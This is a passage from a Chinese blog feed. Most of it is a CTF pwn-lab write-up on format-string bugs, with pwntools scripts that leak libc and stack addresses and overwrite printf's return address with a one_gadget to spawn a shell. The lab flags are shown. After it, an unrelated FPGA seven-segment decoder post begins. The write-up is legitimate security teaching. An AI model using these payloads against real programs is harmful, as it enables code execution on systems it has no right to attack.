&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bin_sh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">one_gadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xebc85&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fmtstr_payload&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="n">puts_got&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">one_gadget&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;what&amp;#39;s your message: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行效果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/ybIgmqwYWkE7XUQ.png"
loading="lazy"
alt="image-20240728225703142.png"
>&lt;/p>
&lt;p>成功获取 shell 的控制权。最终得到 flag 为 &lt;code>AAA{i_l0v3_fmtstr_payload_H0p3_u_Loveit_2}&lt;/code> ，然而我自我感觉也许可能不会很 love it :D 卡了我两天（怨）&lt;/p>
&lt;h2 id="task4-fsb-stack">Task4 fsb-stack
&lt;/h2>&lt;p>本题目的完整代码为 attachment 中的 &lt;code>pwnlab2_task4_code.py&lt;/code>&lt;/p>
&lt;h3 id="preparation-2">Preparation
&lt;/h3>&lt;p>&lt;code>checksec&lt;/code> 一下，除了 Canary 以外保护全开（在 IDA 里反汇编也没看到 stack_check_fail ）。 &lt;code>main()&lt;/code> 反编译后的代码如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__fastcall&lt;/span> &lt;span class="n">__noreturn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">66&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-210h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">65&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">initbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">envp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">512&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200uLL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">512&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>自带无限次使用次数的 FSB 。打开程序，输入 &lt;code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p&lt;/code> 确认格式字符串偏移，结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/uNBpfj9A6l2Q4Dv.png"
loading="lazy"
alt="image-20240728230716046.png"
>&lt;/p>
&lt;p>可以看到 &lt;code>AAAAAAAA&lt;/code> 位于格式字符串后第六个偏移。&lt;/p>
&lt;p>目前的想法就是，通过 &lt;code>printf()&lt;/code> 泄漏出 &lt;code>main()&lt;/code> 的返回地址得到 libc 地址。&lt;/p>
&lt;p>但是打开了 FULL RELRO ，不能覆写 GOT 表，所以试试 ROP，利用格式字符串任意位置泄漏栈地址，然后利用任意写将 &lt;code>printf()&lt;/code> 的返回地址设为 one_gadget。&lt;/p>
&lt;h3 id="leaking-libc-address-1">Leaking libc address
&lt;/h3>&lt;p>通过 gdb 动态调试，断点进入 &lt;code>printf()&lt;/code> 内，在栈中寻找到 &lt;code>main()&lt;/code> 的返回地址相对于格式字符串的偏移位置。首先来看 Backtrace ，确定 &lt;code>printf()&lt;/code> 的返回地址为 &lt;code>0x55555555528d&lt;/code> ，位于 &lt;code>main()&lt;/code> 内，则 &lt;code>main()&lt;/code> 的返回地址为 &lt;code>0x7ffff7c29d90&lt;/code> ，而 &lt;code>0x7ffff7c29e40&lt;/code> 相对 &lt;code>__libc_start_main&lt;/code> 的偏移是 +128 ，所以 &lt;code>__libc_start_main&lt;/code> 相对 &lt;code>main()&lt;/code> 的返回地址 的偏移是 (-0xd90 + 0xe40) - 128 = +0x30 。&lt;/p>
&lt;pre>&lt;font color="#12488B">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────&lt;/font>
► 0 0x7ffff7c606f0 printf
1 0x55555555528d
2 0x7ffff7c29d90
3 0x7ffff7c29e40 __libc_start_main+128
4 0x5555555550e5
&lt;font color="#12488B">────────────────────────────────────────────────────────────────────────────────&lt;/font>
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>
&lt;/pre>
&lt;p>接下来，在栈中找到 &lt;code>0x7ffff7c29d90&lt;/code> 相对于格式字符串的偏移位置：&lt;/p>
&lt;pre>&lt;font color="#12488B">────────────────────────────────────────────────────────────────────────────────&lt;/font>
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>x /100gx $rsp
&lt;font color="#12488B">0x7fffffffd9c8&lt;/font>: 0x000055555555528d 0x7944734973696854
&lt;font color="#12488B">0x7fffffffd9d8&lt;/font>: 0x7375446c65674e41 0x000000000a726574
&lt;font color="#12488B">0x7fffffffd9e8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffd9f8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">&lt; Skipped >&lt;/font>
&lt;font color="#12488B">0x7fffffffdbc8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbd8&lt;/font>: 0x5b70ffa5294da700 0x0000000000000001
&lt;font color="#ff0000">0x7fffffffdbe8&lt;/font>: 0x00007ffff7c29d90 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbf8&lt;/font>: 0x00005555555551f0 0x0000000100000000
&lt;font color="#12488B">&lt; Skipped >&lt;/font>
&lt;font color="#12488B">0x7fffffffdcb8&lt;/font>: 0x00005555555550c0 0x00007fffffffdcf0
&lt;font color="#12488B">0x7fffffffdcc8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdcd8&lt;/font>: 0x00005555555550e5 0x00007fffffffdce8
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>
&lt;/pre>
&lt;p>可以看到， &lt;code>0x00007ffff7c29d90&lt;/code> 位于 &lt;code>0x7fffffffdbe8&lt;/code> 处，而 rsp 指向 &lt;code>0x7fffffffd9c8&lt;/code> ，所以在栈中是第 69 位，因此就是格式字符串的第 73 位参数。事实上，若在调试时输入 &lt;code>%73$016llx&lt;/code> ，程序确实会输出 &lt;code>00007ffff7c29d90&lt;/code> ，符合要求。&lt;/p>
&lt;p>编写下面的 python 代码以获取 libc 基址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># First payload: leaking libc address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;%73$016l&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;lxKKKKKK&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">recv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main_ret_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__libc_start_main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">main_ret_addr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">__libc_start_main_addr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;main_ret_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">main_ret_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/phyjcWksBP1intq.png"
loading="lazy"
alt="image-20240728234411166.png"
>&lt;/p>
&lt;p>获得 libc 地址为 &lt;code>0x000079FB95A00000&lt;/code>&lt;/p>
&lt;h3 id="leaking-stack-address">Leaking stack address
&lt;/h3>&lt;p>由于栈之间的相对偏移应该不变，所以应该可以通过找到一个链：栈上一个位置 A ，其指向栈的另一个位置 B ，找到 A 、 B 其关于格式字符串的偏移位置。然后利用 &lt;code>printf() %x&lt;/code> 向 B 的地址漏出来，因此就可以找出 rsp 的地址，最后就可以将 printf_ret_addr 改写成 one_gadget。&lt;/p>
&lt;p>在一次动态调试中，我注意到了这样一个可以存在的链（注意红色字）：&lt;/p>
&lt;pre>&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>x /110gx $rsp
&lt;font color="#12488B">0x7fffffffd9c8&lt;/font>: 0x000055555555528d 0x654a6568546e7552
&lt;font color="#12488B">0x7fffffffd9d8&lt;/font>: 0x0000000a736c6577 0x0000000000000000
&lt;font color="#12488B"> &lt; skipped > &lt;/font>
&lt;font color="#12488B">0x7fffffffdbc8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbd8&lt;/font>: 0xdf6e9e6f3d379b00 0x0000000000000001
&lt;font color="#12488B">0x7fffffffdbe8&lt;/font>: 0x00007ffff7c29d90 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbf8&lt;/font>: 0x00005555555551f0 0x0000000100000000
&lt;font color="#FF0000">0x7fffffffdc08&lt;/font>: &lt;font color="#FF0000">0x00007fffffffdcf8&lt;/font> 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdc18&lt;/font>: 0x8843981ffe157fda 0x00007fffffffdcf8
&lt;font color="#12488B"> &lt; skipped > &lt;/font>
&lt;font color="#12488B">0x7fffffffdce8&lt;/font>: 0x000000000000001c 0x0000000000000001
&lt;font color="#FF0000">0x7fffffffdcf8&lt;/font>: 0x00007fffffffe083 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdd08&lt;/font>: 0x00007fffffffe0a8 0x00007fffffffe0be
&lt;font color="#12488B">0x7fffffffdd18&lt;/font>: 0x00007fffffffe0e7 0x00007fffffffe15b
&lt;font color="#12488B">0x7fffffffdd28&lt;/font>: 0x00007fffffffe1b1 0x00007fffffffe1c2
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>
&lt;/pre>
&lt;p>&lt;code>0x7fffffffdc08&lt;/code> 处的内存指向栈的另一处内存 &lt;code>0x00007fffffffdcf8&lt;/code> ，而 rsp 指向 &lt;code>0x7fffffffd9c8&lt;/code> ，所以 A 在栈中第 73 个位置，是相对格式字符串第 77 个参数，而 B 在栈中第 103 个位置， 相对 rsp 偏移值为 (103 - 1) * 8 = 0x330 。&lt;/p>
&lt;p>编写如下 payload 获取 &lt;code>printf()&lt;/code> 的返回地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Second payload : leaking stack address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;%77$016l&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;lxKKKKKK&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">recv2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">arg_103_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">recv2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">printf_ret_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">arg_103_addr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x330&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;arg_103_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg_103_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;printf_ret_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">printf_ret_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行效果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/pEO7SYrc8qwVimn.png"
loading="lazy"
alt="image-20240729170544644.png"
>&lt;/p>
&lt;p>获得 &lt;code>printf()&lt;/code> 栈基址为 &lt;code>0x00007FFF27F65378&lt;/code>&lt;/p>
&lt;h3 id="hijacking-printf-return-addr--getting-system-shell">Hijacking printf() return addr &amp;amp; getting system shell
&lt;/h3>&lt;p>编写如下 payload 以执行 system call shell 并获取flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Third payload: getting system shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">one_gadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xebc85&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fmtstr_payload&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="n">printf_ret_addr&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">one_gadget&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>最终运行结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/Mv6dyTt4zFNbJ5a.png"
loading="lazy"
alt="image-20240729170928581.png"
>&lt;/p>
&lt;p>获得 flag 为 &lt;code>AAA{3sc@pe_f3Om_wh1l3_1_i5_E4sy}&lt;/code>&lt;/p></description></item><item><title>FPGA02_七段数码管显示译码器设计与应用</title><link>https://nepl1t.github.io/p/fpga02_%E4%B8%83%E6%AE%B5%E6%95%B0%E7%A0%81%E7%AE%A1%E6%98%BE%E7%A4%BA%E8%AF%91%E7%A0%81%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</link><pubDate>Mon, 15 Apr 2024 03:12:52 +0800</pubDate><guid>https://nepl1t.github.io/p/fpga02_%E4%B8%83%E6%AE%B5%E6%95%B0%E7%A0%81%E7%AE%A1%E6%98%BE%E7%A4%BA%E8%AF%91%E7%A0%81%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</guid><description>&lt;h2 id="背景">背景
&lt;/h2>&lt;p>七段数码管是由 7+1 个 LED 构成的数字显示器件，其中前面七个 LED 各自显示数字的一段，最后的一个LED显示小数点。它有十二个引脚，其中八个引脚用于控制七段数码管显示什么图案，四个引脚分别作为四位七段数码管的使能信号，即分别控制四位七段数码管是否显示该图案。&lt;/p>
&lt;p>笔者使用的 Arduino 板的 LED 是 &lt;strong>共阳极的，因此低电平才能点亮，即当信号为 0 时亮起，为 1 时熄灭&lt;/strong>。为了节约管脚，它们都使用了同一组输入信号，因此同一时间四个七段数码管都会显示相同的内容。如下图：&lt;/p>
&lt;p>&lt;img src="https://huxibu-alkyimyia.github.io/img/lab6/1.jpg"
loading="lazy"
alt="Working principle of 7-Segment display"
>&lt;/p>
&lt;p>本次我们要使用七段数码管实现十六进制译码器 (Hex 7-Segment Decoder Display)，并且实现数码管显示功能。&lt;/p>
&lt;h2 id="真值表与电路设计">真值表与电路设计
&lt;/h2>&lt;p>七段数码管可以将十六进制数字以下图的形式显示：&lt;/p>
